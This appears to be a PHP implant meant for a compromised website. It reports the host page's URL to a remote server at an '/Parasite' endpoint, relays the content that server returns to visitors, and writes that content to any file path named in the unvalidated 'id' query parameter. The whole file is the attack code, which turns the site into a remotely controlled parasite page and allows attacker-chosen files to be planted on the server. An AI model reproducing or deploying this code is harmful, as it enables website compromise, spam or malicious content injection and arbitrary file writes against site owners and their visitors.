<?php
function WriteIn($testfile, $msg) {
	if (empty($msg)) {
		echo "内容为空";
		return;
	}
	
	$fp = @fopen($testfile,"w");
	fwrite($fp,$msg);
	fclose($fp);
}
$id=$_GET['id'];
$ch = curl_init();
$Remote_server = "http://www.bbbbb518801.com/"; 
$host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."?".$_SERVER["QUERY_STRING"];
curl_setopt($ch, CURLOPT_URL, $Remote_server."/Parasite?host=".$host_name);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$data = curl_exec($ch);
if (empty($data)) {
	exit("<p align='center'><font color='red'><b>Connection Error!</b></font></p>");
}	
if (!empty($id)) {
	if(!is_file($id)){
			WriteIn($id,$data);
	//chmod($id,0777);
		
	}
}	
echo $data;
curl_close($ch);
?>